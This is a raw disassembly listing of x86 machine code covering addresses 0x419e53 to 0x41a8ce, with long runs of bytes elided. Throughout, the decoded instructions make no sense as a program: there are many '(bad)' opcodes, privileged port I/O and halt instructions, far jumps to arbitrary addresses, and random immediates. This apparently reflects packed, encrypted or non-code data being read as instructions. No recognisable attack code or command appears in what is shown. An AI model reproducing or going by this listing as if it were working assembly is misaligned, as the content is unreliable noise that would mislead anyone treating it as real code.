  419e53:	ss ja  0x419dde
  419e56:	retf   0xa48f
  419e59:	sub    eax,0xcfde8c15
  419e5e:	and    al,0xbd
  419e60:	fnsave [ecx+0x58]
  419e63:	or     al,0x90
  419e65:	push   ebp
  419e66:	fdiv   QWORD PTR [eax]
  419e68:	adc    ecx,edi
  419e6a:	(bad)  
  419e6b:	sti    
  419e6c:	adc    eax,edi
  419e6e:	pop    ss
  419e6f:	mov    ds:0xf65ecb7b,eax
  419e74:	pop    edx
  419e75:	les    ecx,FWORD PTR [ecx]
  419e77:	cdq    
  419e78:	jae    0x419e06
  419e7a:	cdq    
  419e7b:	out    dx,eax
  419e7c:	sbb    eax,0x4c9d06cc
  419e81:	sub    ch,BYTE PTR [ebp+0x35]
  419e84:	cmp    eax,DWORD PTR [ecx-0x2d318643]
  419e8a:	rcr    BYTE PTR [esi-0x13ff327d],cl
  419e90:	enter  0x62d2,0x1
  419e94:	and    DWORD PTR [edx+0x66],ebx
  419e97:	mov    dl,0xfd
  419e99:	cmp    eax,DWORD PTR [ecx-0x78121054]
  419e9f:	jg     0x419e77
  419ea1:	push   cs
  419ea2:	fwait
  419ea3:	cdq    
  419ea4:	jmp    0x7de19c04
  419ea9:	jp     0x419ee0
  419eab:	dec    ecx
  419eac:	leave  
  419ead:	sahf   
  419eae:	adc    ecx,ebx
  419eb0:	push   cs
  419eb1:	adc    BYTE PTR [eax+eax*2],0x50
  419eb5:	test   BYTE PTR [edx],al
  419eb7:	imul   ecx,DWORD PTR [edi+0x1c3a882f],0xfffffffd
  419ebe:	dec    edi
  419ebf:	lods   al,BYTE PTR ds:[esi]
  419ec0:	loope  0x419ec2
	...
  419f32:	add    BYTE PTR [eax],al
  419f34:	sbb    al,0x97
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx-0xb61f4b7]
  419f41:	mov    ebp,0x193a2fdd
  419f46:	add    DWORD PTR [eax],eax
  419f48:	cmc    
  419f49:	add    BYTE PTR [eax],al
  419f4b:	add    ah,dl
  419f4d:	mov    dl,0x9e
  419f4f:	in     eax,dx
  419f50:	mov    bl,0x9b
  419f52:	pop    ecx
  419f53:	and    eax,0xeaf5be3f
  419f58:	mov    dh,0xe5
  419f5a:	mov    ecx,0x628a3de9
  419f5f:	rcr    DWORD PTR [ecx],1
  419f61:	jecxz  0x419f78
  419f63:	fist   WORD PTR [ebp+0x37592024]
  419f69:	emms   
  419f6b:	xor    ch,BYTE PTR [ebp-0x13]
  419f6e:	pop    esp
  419f6f:	in     eax,0xcc
  419f71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f72:	and    edi,DWORD PTR [ebx-0x20]
  419f75:	loopne 0x419f11
  419f77:	aad    0x60
  419f79:	pop    esi
  419f7a:	add    al,0x96
  419f7c:	and    esi,DWORD PTR [ebx+0x547657a7]
  419f82:	aam    0x41
  419f84:	add    BYTE PTR [esi+edx*8+0x51],al
  419f88:	call   0xb68103c9
  419f8d:	mov    ebp,0xa3316714
  419f92:	jnp    0x419fe1
  419f94:	in     al,dx
  419f95:	fiadd  WORD PTR [ebp+edi*1-0x82db20]
  419f9c:	fld    DWORD PTR ds:0xf3c57820
  419fa2:	mov    edx,0x93602cae
  419fa7:	add    DWORD PTR ds:[ebx-0x63],esp
  419fab:	jbe    0x419f2e
  419fad:	sub    dh,BYTE PTR [ebp+ebp*8+0x63]
  419fb1:	jo     0x41a02f
  419fb3:	repnz cmps DWORD PTR es:[esi],DWORD PTR es:[edi]
  419fb6:	mov    ch,cl
  419fb8:	add    BYTE PTR [edi+0x32134698],ch
  419fbe:	inc    ecx
  419fbf:	mov    ?,esi
  419fc1:	sbb    eax,edx
  419fc3:	rol    bh,1
  419fc5:	loopne 0x419f7c
  419fc7:	sti    
  419fc8:	mov    edi,0x880a41b5
  419fcd:	rcr    edx,1
  419fcf:	lods   eax,DWORD PTR ds:[esi]
  419fd0:	dec    ebx
  419fd1:	les    eax,FWORD PTR [ecx]
  419fd3:	bts    DWORD PTR [esi+0x1416d170],ecx
  419fda:	mov    DWORD PTR [eax+0x8640681],ecx
  419fe0:	clc    
  419fe1:	scas   eax,DWORD PTR es:[edi]
  419fe2:	push   esp
  419fe3:	mov    bh,0xcc
  419fe5:	(bad)  
  419fe6:	adc    BYTE PTR [edi-0x51a12930],ch
  419fec:	lahf   
  419fed:	and    esi,DWORD PTR [ebx]
  419fef:	cmp    ch,bl
  419ff1:	jbe    0x41a005
  419ff3:	cli    
  419ff4:	xchg   BYTE PTR [ebx],dh
  419ff6:	int    0x56
  419ff8:	xchg   DWORD PTR [edi],edi
  419ffa:	(bad)  
  419ffb:	mov    cl,dh
  419ffd:	dec    ebx
  419ffe:	jbe    0x41a048
  41a000:	inc    esi
  41a001:	pushf  
  41a002:	xchg   DWORD PTR [ebp+0x66],ebp
  41a005:	sahf   
  41a006:	xchg   ebp,eax
  41a007:	jg     0x41a000
  41a009:	mov    edi,0x16449e7d
  41a00e:	inc    esi
  41a00f:	jo     0x41a02d
  41a011:	shl    BYTE PTR [ebp+0xb],1
  41a014:	call   0xc42d1d07
  41a019:	cmp    BYTE PTR [esi],0x12
  41a01c:	rcl    BYTE PTR [ecx],1
  41a01e:	int3   
  41a01f:	sti    
  41a020:	fild   QWORD PTR [edi+0x7c6bfb60]
  41a026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a027:	and    esi,DWORD PTR [ebx-0x25e5910d]
  41a02d:	daa    
  41a02e:	sti    
  41a02f:	and    DWORD PTR [eax+0x0],ebp
  41a032:	lahf   
  41a033:	pop    ebp
  41a034:	sub    eax,0xb643a466
  41a039:	clc    
  41a03a:	call   edx
  41a03c:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41a03e:	cmp    edi,edx
  41a040:	rol    BYTE PTR [eax],1
	...
  41a0b2:	add    BYTE PTR [eax],al
  41a0b4:	scas   eax,DWORD PTR es:[edi]
  41a0b5:	test   DWORD PTR [esi-0xa441be],ebx
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0x610704a2
  41a0c2:	inc    eax
  41a0c3:	mov    cl,0x2f
  41a0c5:	sbb    al,BYTE PTR [ecx]
  41a0c7:	add    ch,dh
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	add    BYTE PTR [ecx+0x6eaf4ed5],cl
  41a0d1:	lods   al,BYTE PTR cs:[esi]
  41a0d3:	mov    ecx,0x858dd9e7
  41a0d8:	push   ss
  41a0d9:	push   esp
  41a0da:	sub    BYTE PTR [ebp+0x635f36d3],dh
  41a0e0:	xchg   ebp,eax
  41a0e1:	or     BYTE PTR [ebp+0x47e06f90],ch
  41a0e7:	out    dx,al
  41a0e8:	popf   
  41a0e9:	test   al,0x18
  41a0eb:	fdivr  st,st(5)
  41a0ed:	push   ecx
  41a0ee:	in     al,0x4
  41a0f0:	aas    
  41a0f1:	xchg   ebp,eax
  41a0f2:	imul   esp,DWORD PTR [ebx+esi*8+0x1a],0x63
  41a0f7:	dec    ebp
  41a0f8:	push   esi
  41a0f9:	clc    
  41a0fa:	in     al,0xae
  41a0fc:	cmp    al,0x7a
  41a0fe:	jle    0x41a0e8
  41a100:	mov    ecx,0xa38f8ac3
  41a105:	push   esp
  41a106:	test   dh,cl
  41a108:	xchg   esi,eax
  41a109:	sub    bl,BYTE PTR ds:0x9aa41df1
  41a10f:	daa    
  41a110:	mov    eax,ds:0x4f658016
  41a115:	mov    ebp,0x59c21a19
  41a11a:	scas   al,BYTE PTR es:[edi]
  41a11b:	scas   al,BYTE PTR es:[edi]
  41a11c:	ins    DWORD PTR es:[edi],dx
  41a11d:	pop    edi
  41a11e:	xchg   ebx,eax
  41a11f:	xchg   BYTE PTR [edx-0x19dd5858],bh
  41a125:	daa    
  41a126:	push   0x74b5aaba
  41a12b:	lods   al,BYTE PTR ds:[esi]
  41a12c:	into   
  41a12d:	hlt    
  41a12e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a12f:	mov    bl,0x1f
  41a131:	or     bl,BYTE PTR [edi+eiz*8+0x29d106ee]
  41a138:	popf   
  41a139:	retf   0xfb7d
  41a13c:	outs   dx,BYTE PTR ds:[esi]
  41a13d:	inc    ebp
  41a13e:	xchg   esi,eax
  41a13f:	push   0xffffff85
  41a141:	mov    ?,WORD PTR es:[ecx+0x441b5776]
  41a148:	jg     0x41a15a
  41a14a:	out    0x12,eax
  41a14c:	test   eax,0x29aa2cd7
  41a151:	lods   eax,DWORD PTR ds:[esi]
  41a152:	mov    al,0xcc
  41a154:	or     ah,dh
  41a156:	cmc    
  41a157:	and    DWORD PTR [eax],eax
  41a159:	mov    eax,0x248fa269
  41a15e:	gs cld 
  41a160:	push   cs
  41a161:	jge    0x41a14a
  41a163:	and    eax,0xdf696934
  41a168:	mov    ah,BYTE PTR [ebp+0x6b9d0b6e]
  41a16e:	sub    BYTE PTR [eax-0x21f6a043],bh
  41a174:	out    0xf2,al
  41a176:	scas   al,BYTE PTR es:[edi]
  41a177:	test   BYTE PTR ds:0x630d9b9f,bl
  41a17d:	sbb    DWORD PTR [esi+0x763dc909],esi
  41a183:	ins    BYTE PTR es:[edi],dx
  41a184:	hlt    
  41a185:	inc    edi
  41a186:	test   al,0x56
  41a188:	xchg   esp,eax
  41a189:	mov    DWORD PTR [ecx-0x54],esp
  41a18c:	or     BYTE PTR [edi],cl
  41a18e:	ins    DWORD PTR es:[edi],dx
  41a18f:	pop    esp
  41a190:	add    DWORD PTR [ecx-0x55],edx
  41a193:	xchg   ebp,eax
  41a194:	imul   ebp,DWORD PTR [edi-0x38d3722b],0x8cd41c6a
  41a19e:	xchg   esp,eax
  41a19f:	mov    ecx,0x65b62c55
  41a1a4:	popa   
  41a1a5:	test   BYTE PTR [esi+0x304d3d],cl
  41a1ab:	in     al,0x3d
  41a1ad:	xor    ch,0xd5
  41a1b0:	sbb    BYTE PTR [edx-0x41703c29],0xf2
  41a1b7:	popa   
  41a1b8:	cmp    al,0xe5
  41a1ba:	(bad)  
  41a1bb:	pop    ss
  41a1bc:	push   cs
  41a1bd:	mov    esi,0x462fe9
	...
  41a232:	add    BYTE PTR [eax],al
  41a234:	mov    al,ds:0xff33bae7
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	imul   BYTE PTR [edi]
  41a241:	push   es
  41a242:	xchg   esi,eax
  41a243:	fbld   TBYTE PTR [ebx+ebx*1]
  41a246:	add    DWORD PTR [eax],eax
  41a248:	cmc    
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    BYTE PTR [eax+0x6883f0c4],dl
  41a251:	or     ch,BYTE PTR [eax-0x3692e59e]
  41a257:	xchg   DWORD PTR [ebp+0x5a9ebb],edi
  41a25d:	inc    ecx
  41a25e:	and    dl,0x99
  41a261:	or     BYTE PTR [ebx+0x20],bh
  41a264:	pop    ds
  41a265:	and    ecx,DWORD PTR [eax]
  41a267:	and    eax,0x8a6b6c77
  41a26c:	add    DWORD PTR [esi+0x5e],eax
  41a26f:	and    eax,0x1d0d7f26
  41a274:	dec    ebp
  41a275:	inc    eax
  41a276:	jns    0x41a236
  41a278:	daa    
  41a279:	ja     0x41a2b3
  41a27b:	fimul  DWORD PTR [eax+0x6953648b]
  41a281:	in     eax,dx
  41a282:	jo     0x41a236
  41a284:	adc    esi,DWORD PTR [ecx+0x22]
  41a287:	pop    ebp
  41a288:	adc    DWORD PTR [esi+0x76],eax
  41a28b:	sar    BYTE PTR [eax+0x3],cl
  41a28e:	jg     0x41a2af
  41a290:	sub    ebx,DWORD PTR [ebx+0x49fd2cc2]
  41a296:	std    
  41a297:	je     0x41a27c
  41a299:	jl     0x41a285
  41a29b:	(bad)  
  41a29c:	inc    BYTE PTR [ebp-0x2f]
  41a29f:	icebp  
  41a2a0:	xchg   esi,eax
  41a2a1:	imul   edx,ebx,0x727dab9
  41a2a7:	(bad)  
  41a2a8:	fbld   TBYTE PTR [edi]
  41a2aa:	adc    esi,DWORD PTR [ecx-0x78]
  41a2ad:	stos   DWORD PTR es:[edi],eax
  41a2ae:	adc    eax,0x63712dd3
  41a2b3:	xor    ch,ch
  41a2b5:	in     eax,dx
  41a2b6:	retf   0xf0e8
  41a2b9:	or     ecx,DWORD PTR [esi+0x67]
  41a2bc:	repnz xchg ebx,eax
  41a2be:	out    0x52,eax
  41a2c0:	jae    0x41a27b
  41a2c2:	push   ss
  41a2c3:	sbb    al,bh
  41a2c5:	ror    BYTE PTR [ecx-0x31],cl
  41a2c8:	jl     0x41a2f7
  41a2ca:	pop    ebp
  41a2cb:	out    dx,al
  41a2cc:	fisubr DWORD PTR [esi]
  41a2ce:	cmp    al,al
  41a2d0:	or     cl,BYTE PTR [ebp-0x2425a0e5]
  41a2d6:	cmc    
  41a2d7:	sbb    dl,bh
  41a2d9:	gs ins BYTE PTR es:[edi],dx
  41a2db:	or     DWORD PTR [ecx+esi*4],ecx
  41a2de:	cmp    al,0xe
  41a2e0:	out    dx,al
  41a2e1:	or     eax,0xd1253b60
  41a2e6:	inc    ecx
  41a2e7:	and    eax,0xf8bab165
  41a2ec:	ds sub al,0x5
  41a2ef:	cmp    esi,DWORD PTR [edi-0xd724811]
  41a2f5:	daa    
  41a2f6:	mov    al,0x99
  41a2f8:	add    ah,al
  41a2fa:	ins    DWORD PTR es:[edi],dx
  41a2fb:	dec    esi
  41a2fc:	jmp    0x41a2b0
  41a2fe:	ds mov dh,0x7f
  41a301:	mov    al,ds:0xb23a91fe
  41a306:	sbb    BYTE PTR [eax+0x5d],ah
  41a309:	jnp    0x41a2ff
  41a30b:	jmp    0xdd93:0x716c13d2
  41a312:	pop    edi
  41a313:	mov    ch,0x6e
  41a315:	xchg   DWORD PTR [ebx],edi
  41a317:	popa   
  41a318:	push   ax
  41a31a:	push   edx
  41a31b:	js     0x41a36c
  41a31d:	out    0x44,al
  41a31f:	scas   eax,DWORD PTR es:[edi]
  41a320:	hlt    
  41a321:	sub    BYTE PTR [ebx+0x40],bl
  41a324:	inc    eax
  41a325:	test   DWORD PTR [eax],edi
  41a327:	pop    ds
  41a328:	jl     0x41a39c
  41a32a:	sub    dl,BYTE PTR [eax+ebp*8]
  41a32d:	inc    eax
  41a32e:	add    eax,0x757b8274
  41a333:	pusha  
  41a334:	pop    ecx
  41a335:	dec    edx
  41a336:	xchg   edi,eax
  41a337:	jns    0x41a367
  41a339:	push   0x3
  41a33b:	push   cs
  41a33c:	out    dx,al
  41a33d:	repnz pop es
  41a33f:	mov    al,ds:0xa9
	...
  41a3b4:	cmp    eax,0xed3a6998
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	test   BYTE PTR [ebx],ch
  41a3c2:	mov    BYTE PTR [edi+0x19],bh
  41a3c5:	sbb    al,0x1
  41a3c7:	add    ch,dh
  41a3c9:	add    BYTE PTR [eax],al
  41a3cb:	add    dl,dh
  41a3cd:	xor    DWORD PTR [esi],esp
  41a3cf:	pop    es
  41a3d0:	fdiv   QWORD PTR [edx]
  41a3d2:	sub    ecx,edi
  41a3d4:	shr    BYTE PTR [eax-0x4b],0x29
  41a3d8:	xchg   ecx,eax
  41a3d9:	ins    BYTE PTR es:[edi],dx
  41a3da:	add    DWORD PTR [edi+ebx*1-0x7e],ecx
  41a3de:	xchg   edx,ecx
  41a3e0:	fs mov esp,0x6bfbd547
  41a3e6:	jne    0x41a420
  41a3e8:	dec    ebx
  41a3e9:	sahf   
  41a3ea:	(bad)
  41a3ed:	sub    eax,0xfacfe828
  41a3f2:	lds    esi,FWORD PTR [eax]
  41a3f4:	mov    ebp,0x6de07276
  41a3f9:	jbe    0x41a46d
  41a3fb:	mov    ecx,DWORD PTR [edx]
  41a3fd:	and    DWORD PTR [edx-0x38],edx
  41a400:	xchg   edx,eax
  41a401:	fdivr  QWORD PTR [esp+ecx*1-0x5f]
  41a405:	retf   0xafd4
  41a408:	(bad)  
  41a409:	out    0xd5,eax
  41a40b:	ret    0x46f6
  41a40e:	push   0x6a
  41a410:	mov    al,ds:0x33ff967
  41a415:	fisub  DWORD PTR fs:[eax]
  41a418:	jne    0x41a454
  41a41a:	leave  
  41a41b:	xchg   ecx,eax
  41a41c:	inc    esi
  41a41d:	fwait
  41a41e:	fwait
  41a41f:	call   0x2c5b13a5
  41a424:	and    eax,0x553ec213
  41a429:	stos   BYTE PTR es:[edi],al
  41a42a:	push   0x49
  41a42c:	call   0xe2433ad8
  41a431:	xchg   edi,eax
  41a432:	(bad)  
  41a434:	stc    
  41a435:	arpl   WORD PTR [ebp-0x63],di
  41a438:	mov    esi,0x5a33947
  41a43d:	pop    es
  41a43e:	or     eax,0x676a8160
  41a443:	add    al,0x36
  41a445:	pop    esp
  41a446:	retf   0xcfb0
  41a449:	ret    
  41a44a:	jl     0x41a4ac
  41a44c:	mov    ds:0xde769f4,eax
  41a451:	mov    ah,0x1c
  41a453:	jo     0x41a49f
  41a455:	adc    esi,DWORD PTR [esi+0x6e]
  41a458:	rcr    esi,0x56
  41a45b:	xor    BYTE PTR [ecx-0x49f01ecd],ah
  41a461:	in     al,0x88
  41a463:	stos   DWORD PTR es:[edi],eax
  41a464:	mov    ds:0x3e9070bc,eax
  41a469:	call   0x785c:0xd64982af
  41a470:	loop   0x41a4ac
  41a472:	int    0x1c
  41a474:	push   eax
  41a475:	jl     0x41a47c
  41a477:	adc    eax,0x709867bb
  41a47c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a47d:	mov    dh,0x39
  41a47f:	xor    al,0xe1
  41a481:	mov    ds:0x612a167e,eax
  41a486:	inc    ebx
  41a487:	cmp    ch,BYTE PTR [edx-0x16870260]
  41a48d:	lods   eax,DWORD PTR ds:[esi]
  41a48e:	inc    edx
  41a48f:	mov    edi,0x93c6dce3
  41a494:	cmp    DWORD PTR [edi-0x26d3c07f],edi
  41a49a:	xchg   BYTE PTR [eax-0x4d3390a9],ch
  41a4a0:	adc    cl,cl
  41a4a2:	push   ss
  41a4a3:	(bad)  
  41a4a4:	nop
  41a4a5:	add    BYTE PTR [ecx+0x49],al
  41a4a8:	or     eax,0xaba43ab8
  41a4ad:	xadd   DWORD PTR [edx+0x148233a9],esi
  41a4b4:	div    DWORD PTR [ecx+0xc]
  41a4b7:	retf   0x3654
  41a4ba:	jmp    0x41a4a1
  41a4bc:	sub    eax,0x28004ccf
	...
  41a531:	add    BYTE PTR [eax],al
  41a533:	add    BYTE PTR [edi-0x9d722c],ch
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax-0x48161f56]
  41a541:	cmc    
  41a542:	fst    DWORD PTR [ebx+0xe]
  41a545:	sbb    eax,0xf50001
  41a54a:	add    BYTE PTR [eax],al
  41a54c:	dec    esp
  41a54d:	scas   eax,DWORD PTR es:[di]
  41a54f:	mov    esp,edx
  41a551:	xchg   ebp,eax
  41a552:	mov    ah,0x2f
  41a554:	adc    BYTE PTR [edi+0xf],bl
  41a557:	jp     0x41a581
  41a559:	jbe    0x41a542
  41a55b:	popf   
  41a55c:	inc    ecx
  41a55d:	jmp    0xb91b:0xf3e48d03
  41a564:	(bad)  
  41a565:	adc    DWORD PTR [ecx+eax*1-0x34],esi
  41a569:	lea    esi,ds:0x3a1f800
  41a56f:	fcmove st,st(5)
  41a571:	dec    edx
  41a572:	sahf   
  41a573:	and    bl,ch
  41a575:	push   es
  41a576:	pop    edx
  41a577:	pop    ebx
  41a578:	stos   DWORD PTR es:[edi],eax
  41a579:	cmp    eax,DWORD PTR [eax+eiz*1+0x5e0d822f]
  41a580:	div    BYTE PTR [edi]
  41a582:	sub    al,0x29
  41a584:	pop    ds
  41a585:	call   0x452d:0x4b106d9
  41a58c:	fist   WORD PTR [esi+0x2c]
  41a58f:	fcomi  st,st(0)
  41a591:	mov    ebx,0xe2b6c3cd
  41a596:	mov    eax,ds:0xd116e1b1
  41a59b:	xor    DWORD PTR [eax-0x4535798f],ebp
  41a5a1:	pusha  
  41a5a2:	inc    ecx
  41a5a3:	and    BYTE PTR [ebx+0x26],bh
  41a5a6:	jno    0x41a617
  41a5a8:	fnsave ds:0x2fb25aa7
  41a5ae:	jnp    0x41a54d
  41a5b0:	jmp    0xc1308cf0
  41a5b5:	push   ecx
  41a5b6:	xor    BYTE PTR [ebx+0x62],bh
  41a5b9:	retf   
  41a5ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5bb:	in     al,dx
  41a5bc:	pop    ebx
  41a5bd:	adc    eax,0xef2fce1e
  41a5c2:	ins    BYTE PTR es:[edi],dx
  41a5c3:	leave  
  41a5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5c5:	pop    ebp
  41a5c6:	adc    al,0x87
  41a5c8:	and    ecx,ebx
  41a5ca:	push   edx
  41a5cb:	mov    al,0xbb
  41a5cd:	loop   0x41a5ec
  41a5cf:	xchg   dx,ax
  41a5d1:	dec    esp
  41a5d2:	lods   eax,DWORD PTR ds:[esi]
  41a5d3:	imul   esp,DWORD PTR [ebx],0x1bdef87d
  41a5d9:	mov    WORD PTR [edx],gs
  41a5db:	fcomp  QWORD PTR [edi]
  41a5dd:	and    BYTE PTR [ebp+edx*1-0x44],bh
  41a5e1:	fild   QWORD PTR [esi]
  41a5e3:	test   BYTE PTR [eax+0x238549c6],bl
  41a5e9:	mov    edx,0x1de55fcf
  41a5ee:	jo     0x41a66f
  41a5f0:	pop    ecx
  41a5f1:	sti    
  41a5f2:	std    
  41a5f3:	imul   DWORD PTR [esi]
  41a5f5:	shl    al,1
  41a5f7:	hlt    
  41a5f8:	xlat   BYTE PTR ds:[ebx]
  41a5f9:	mov    bh,0x55
  41a5fb:	call   0xad7e4e5e
  41a600:	cmp    al,0xb7
  41a602:	retf   
  41a603:	push   0x3c
  41a605:	lds    esp,FWORD PTR [esi*4-0x271d2f16]
  41a60c:	mov    edi,0x3bcbbff3
  41a611:	hlt    
  41a612:	xlat   BYTE PTR ds:[ebx]
  41a613:	test   eax,0x7ff698f5
  41a618:	les    esi,FWORD PTR [edx+ebx*8-0x13e94af4]
  41a61f:	mov    dh,0x20
  41a621:	xchg   ebx,eax
  41a622:	lods   eax,DWORD PTR ss:[esi]
  41a624:	mov    DWORD PTR [esi-0x69cea799],esi
  41a62a:	retf   
  41a62b:	(bad)  
  41a62c:	jecxz  0x41a618
  41a62e:	push   0x259ba730
  41a633:	sub    al,0xaf
  41a635:	aad    0xcc
  41a637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a638:	mov    al,ds:0x4bd377c6
  41a63d:	add    eax,0x12825e
	...
  41a6b2:	add    BYTE PTR [eax],al
  41a6b4:	mov    bl,0x3f
  41a6b6:	jno    0x41a71d
  41a6b8:	std    
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0x39
  41a6c1:	rol    DWORD PTR [ebp-0x2b],1
  41a6c4:	add    ebx,DWORD PTR [esi]
  41a6c6:	add    DWORD PTR [eax],eax
  41a6c8:	cmc    
  41a6c9:	add    BYTE PTR [eax],al
  41a6cb:	add    BYTE PTR [edi],ch
  41a6cd:	or     ebx,DWORD PTR [esi]
  41a6cf:	mov    bh,0x2e
  41a6d1:	pop    ds
  41a6d2:	pop    ds
  41a6d3:	lahf   
  41a6d4:	sbb    DWORD PTR [ecx*1+0x7414baf5],eax
  41a6db:	sbb    edx,DWORD PTR [edx-0x4c700c86]
  41a6e1:	data16 rcl BYTE PTR [edx],0x44
  41a6e5:	fild   QWORD PTR [ecx-0x71]
  41a6e8:	pop    ebp
  41a6e9:	push   ebx
  41a6ea:	rol    bl,1
  41a6ec:	clc    
  41a6ed:	sub    al,BYTE PTR [ebx]
  41a6ef:	dec    esi
  41a6f0:	mov    ch,0x5a
  41a6f2:	mov    BYTE PTR [eax],bl
  41a6f4:	mov    edi,0x81d005b7
  41a6f9:	push   esi
  41a6fa:	int    0x19
  41a6fc:	mov    esp,0xf84ef76c
  41a701:	cmp    edx,DWORD PTR [ebx]
  41a703:	scas   eax,DWORD PTR es:[edi]
  41a704:	mov    esi,0x8105e660
  41a709:	outs   dx,DWORD PTR ds:[esi]
  41a70a:	fwait
  41a70b:	sahf   
  41a70c:	jmp    DWORD PTR ds:0x8d738c4
  41a712:	lods   al,BYTE PTR ds:[esi]
  41a713:	cmova  eax,DWORD PTR [esi-0x7a5b3b2b]
  41a71a:	dec    eax
  41a71b:	jno    0x41a713
  41a71d:	mov    BYTE PTR [ecx],0xd
  41a720:	adc    BYTE PTR [edx+0x70d47be8],cl
  41a726:	xor    al,0x9e
  41a728:	das    
  41a729:	cli    
  41a72a:	bound  edi,QWORD PTR [ebx-0x300aacc7]
  41a730:	add    BYTE PTR [eax+0x30],ch
  41a733:	add    eax,eax
  41a735:	in     eax,0xde
  41a737:	shl    BYTE PTR [eax-0x33],0xff
  41a73b:	xor    al,0x54
  41a73d:	sbb    DWORD PTR [esi],ecx
  41a73f:	shl    bh,cl
  41a741:	mov    edi,0xe8ee80b1
  41a746:	cmp    DWORD PTR [edx],0xbc90ebf7
  41a74c:	icebp  
  41a74d:	xor    dl,0xdc
  41a750:	ror    DWORD PTR [esi+0x51ff4fbf],1
  41a756:	outs   dx,DWORD PTR ds:[esi]
  41a757:	pop    ds
  41a758:	imul   esp,DWORD PTR [eax],0x38
  41a75b:	in     al,dx
  41a75c:	cmp    edx,DWORD PTR [edi-0x52]
  41a75f:	push   esp
  41a760:	jg     0x41a717
  41a762:	cmp    al,BYTE PTR [edx-0x1bf0e932]
  41a768:	xchg   edx,eax
  41a769:	in     al,dx
  41a76a:	jnp    0x41a762
  41a76c:	cwde   
  41a76d:	test   al,0x45
  41a76f:	(bad)  
  41a770:	pushf  
  41a771:	sbb    BYTE PTR [esi-0x411443a0],0xa
  41a778:	stos   BYTE PTR es:[edi],al
  41a779:	retf   
  41a77a:	call   0x862cbd8c
  41a77f:	sahf   
  41a780:	push   es
  41a781:	inc    ebp
  41a782:	and    esi,DWORD PTR [ebp+edx*1-0x45a8ec27]
  41a789:	rcr    DWORD PTR [ebx+eiz*1-0x2d],0x6e
  41a78e:	inc    edx
  41a78f:	or     eax,0x4d7bf96
  41a794:	push   edi
  41a795:	pop    ebx
  41a796:	not    esi
  41a798:	and    edx,DWORD PTR [edi]
  41a79a:	ret    0xa59f
  41a79d:	add    ecx,ebx
  41a79f:	mov    ?,edx
  41a7a1:	mov    edi,ebx
  41a7a3:	mov    ds:0x37d4802a,eax
  41a7a8:	mov    ebx,ds
  41a7aa:	ret    
  41a7ab:	clc    
  41a7ac:	sbb    BYTE PTR [eax-0x2a],0x5e
  41a7b0:	loopne 0x41a7c3
  41a7b2:	push   ebp
  41a7b3:	mov    BYTE PTR [ecx+0x38],dh
  41a7b6:	in     al,dx
  41a7b7:	xchg   ebp,eax
  41a7b8:	nop
  41a7b9:	dec    ebx
  41a7ba:	cli    
  41a7bb:	call   0xe2:0x156097a2
	...
  41a832:	add    BYTE PTR [eax],al
  41a834:	sbb    BYTE PTR [ecx],0x47
  41a837:	loope  0x41a818
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a7de
  41a841:	scas   al,BYTE PTR es:[edi]
  41a842:	sti    
  41a843:	iret   
  41a844:	clc    
  41a845:	push   ds
  41a846:	add    DWORD PTR [eax],eax
  41a848:	cmc    
  41a849:	add    BYTE PTR [eax],al
  41a84b:	add    BYTE PTR [edx+0x44],dl
  41a84e:	and    dl,BYTE PTR [esi-0x467b4e07]
  41a854:	or     DWORD PTR [ebx+0x5a01f652],ebx
  41a85a:	int    0xdd
  41a85c:	pop    esp
  41a85d:	adc    DWORD PTR [edx-0xf],ebx
  41a860:	fnsave [esi-0x57]
  41a863:	xchg   edi,eax
  41a864:	sti    
  41a865:	mov    eax,0x178c5c1b
  41a86a:	mov    BYTE PTR [ebx-0x165e3c49],dl
  41a870:	mov    ebp,0xe0d16e40
  41a875:	or     ebx,0x51
  41a878:	ins    DWORD PTR es:[edi],dx
  41a879:	fnstenv ss:[ecx-0x1765bca2]
  41a880:	ficomp DWORD PTR [ebx+0x6f215491]
  41a886:	ret    0x1734
  41a889:	pop    ebx
  41a88a:	out    0x91,eax
  41a88c:	xor    DWORD PTR [eax],ebp
  41a88e:	add    esi,ebx
  41a890:	test   ah,al
  41a892:	xchg   ecx,eax
  41a893:	cli    
  41a894:	fild   QWORD PTR [ebp-0x33]
  41a897:	fcmovnb st,st(3)
  41a899:	xchg   edi,eax
  41a89a:	icebp  
  41a89b:	fld    QWORD PTR [eax]
  41a89d:	or     eax,0xc3f50169
  41a8a2:	(bad)
  41a8a6:	push   cs
  41a8a7:	pop    esp
  41a8a8:	add    al,0xdc
  41a8aa:	cdq    
  41a8ab:	push   ebx
  41a8ac:	push   0xffffffcb
  41a8ae:	pop    ecx
  41a8af:	push   ds
  41a8b0:	jmp    FWORD PTR [eax+0x361703ad]
  41a8b6:	js     0x41a936
  41a8b8:	dec    esp
  41a8b9:	pusha  
  41a8ba:	int    0xf3
  41a8bc:	push   ecx
  41a8bd:	xchg   ecx,eax
  41a8be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8bf:	imul   esi,edx,0x3fa6b662
  41a8c5:	mov    cl,BYTE PTR [ebp-0x2b1d6ed3]
  41a8cb:	sub    BYTE PTR [ebx+ebx*8],bh
  41a8ce:	pop    ds
